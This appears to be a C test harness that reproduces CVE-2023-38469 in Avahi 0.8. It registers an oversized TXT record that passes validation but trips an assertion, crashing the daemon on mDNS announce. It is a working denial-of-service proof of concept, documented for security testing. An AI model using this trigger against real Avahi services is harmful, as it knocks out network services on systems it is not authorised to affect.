/**
 * Real CVE-2023-38469 - actual vulnerable Avahi v0.8 (libavahi-core) + ASan/UBSan
 *
 * Reachable assertion (CWE-617) in avahi_dns_packet_append_record()
 * (avahi-core/dns.c):
 *
 *     size = avahi_dns_packet_extend(p, 0) - start;
 *     assert(size <= AVAHI_DNS_RDATA_MAX);     // <-- aborts here
 *
 * In v0.8 avahi_record_is_valid() (avahi-core/rr.c) only checks that each
 * individual TXT string is <= 255 bytes; it does NOT check the *total*
 * serialized rdata against the 16-bit rdlength limit (AVAHI_DNS_RDATA_MAX =
 * 0xFFFF). A TXT record built from enough <=255-byte strings passes
 * is_valid() but serializes to > 65535 bytes, so the assert in
 * avahi_dns_packet_append_record() fires -> SIGABRT, daemon down.
 *
 * The fix (commit a337a1ba7d15853fb56deef1f464529af6e3a1cf, "core: reject
 * overly long TXT resource records") adds a running `used > AVAHI_DNS_RDATA_MAX`
 * check so registration is rejected before it can be appended.
 *
 * TRANSPORT: the oversized TXT is locally registered (here, in this harness;
 * in the wild via avahi D-Bus EntryGroup AddService). The assert then fires
 * inside the mDNS packet-building path when the daemon ANNOUNCES the record on
 * UDP 5353 -- i.e. the crash is in the network response serializer. This
 * harness registers the record and runs the real AvahiServer event loop, so
 * the genuine vulnerable code aborts on announce; no external packet required.
 *
 * This links the ASan-instrumented libavahi-core, so the assert/abort trace
 * lands in `docker logs`.
 *
 * Real CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-38469
 * Affected: avahi <= 0.8 (fixed in 0.9)
 *
 * FOR SECURITY TESTING PURPOSES ONLY - DO NOT USE IN PRODUCTION
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <signal.h>

#include <avahi-core/core.h>
#include <avahi-core/publish.h>
#include <avahi-common/simple-watch.h>
#include <avahi-common/malloc.h>
#include <avahi-common/error.h>
#include <avahi-common/strlst.h>

static AvahiSimplePoll *simple_poll = NULL;
static AvahiSEntryGroup *group = NULL;

/* Build a TXT string list whose total serialized size exceeds
 * AVAHI_DNS_RDATA_MAX (0xFFFF = 65535). Each entry is <= 255 bytes so the
 * v0.8 per-string validity check passes; the SUM is what overflows.
 *   258 entries * (1 length byte + 255 data) = 258 * 256 = 66048 > 65535. */
static AvahiStringList *build_oversized_txt(void) {
    AvahiStringList *l = NULL;
    char buf[256];
    memset(buf, 'A', 255);
    buf[255] = 0;
    for (int i = 0; i < 258; i++)
        l = avahi_string_list_add(l, buf);
    return l;
}

static void entry_group_callback(AvahiServer *s, AvahiSEntryGroup *g,
                                 AvahiEntryGroupState state, void *userdata) {
    (void) s; (void) g; (void) userdata;
    if (state == AVAHI_ENTRY_GROUP_COLLISION || state == AVAHI_ENTRY_GROUP_FAILURE)
        fprintf(stderr, "[*] entry group state=%d\n", state);
}

static void server_callback(AvahiServer *s, AvahiServerState state, void *userdata) {
    (void) userdata;
    fprintf(stderr, "[*] server state=%d\n", state);

    if (state == AVAHI_SERVER_RUNNING) {
        AvahiStringList *txt;
        int ret;

        fprintf(stderr, "[*] server running, registering oversized TXT service...\n");

        if (!group)
            group = avahi_s_entry_group_new(s, entry_group_callback, NULL);

        txt = build_oversized_txt();

        /* This passes v0.8 is_valid() (each string <=255) but the total rdata
         * is > AVAHI_DNS_RDATA_MAX. On commit/announce the daemon serializes it
         * into an mDNS packet and assert(size <= AVAHI_DNS_RDATA_MAX) aborts. */
        ret = avahi_server_add_service_strlst(
            s, group, AVAHI_IF_UNSPEC, AVAHI_PROTO_UNSPEC, 0,
            "OversizedTXT", "_http._tcp", NULL, NULL, 9999, txt);

        avahi_string_list_free(txt);

        fprintf(stderr, "[*] add_service_strlst ret=%d (%s)\n",
                ret, avahi_strerror(ret));

        if (ret == AVAHI_OK) {
            fprintf(stderr, "[*] committing entry group (triggers serialize/announce)...\n");
            avahi_s_entry_group_commit(group);
        }
    }
}

static void sigterm(int sig) {
    (void) sig;
    if (simple_poll)
        avahi_simple_poll_quit(simple_poll);
}

int main(void) {
    AvahiServerConfig config;
    AvahiServer *server = NULL;
    int error;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    signal(SIGTERM, sigterm);
    signal(SIGINT, sigterm);

    printf("===========================================\n");
    printf("  REAL Avahi CVE-2023-38469 (libavahi-core v0.8)\n");
    printf("  assert(size <= AVAHI_DNS_RDATA_MAX) in\n");
    printf("  avahi_dns_packet_append_record (avahi-core/dns.c)\n");
    printf("  Trigger: register TXT whose total rdata > 0xFFFF\n");
    printf("  mDNS UDP 5353 announce path\n");
    printf("  FOR SECURITY TESTING ONLY\n");
    printf("===========================================\n");

    if (!(simple_poll = avahi_simple_poll_new())) {
        fprintf(stderr, "avahi_simple_poll_new failed\n");
        return 1;
    }

    avahi_server_config_init(&config);
    config.publish_hinfo = 0;
    config.publish_addresses = 1;
    config.publish_workstation = 0;
    config.use_ipv6 = 0;
    config.host_name = avahi_strdup("oida-mdns-vuln");

    server = avahi_server_new(avahi_simple_poll_get(simple_poll),
                              &config, server_callback, NULL, &error);
    avahi_server_config_free(&config);

    if (!server) {
        fprintf(stderr, "avahi_server_new failed: %s\n", avahi_strerror(error));
        avahi_simple_poll_free(simple_poll);
        return 1;
    }

    printf("[*] entering event loop on UDP 5353...\n");
    avahi_simple_poll_loop(simple_poll);

    if (server) avahi_server_free(server);
    if (simple_poll) avahi_simple_poll_free(simple_poll);
    return 0;
}
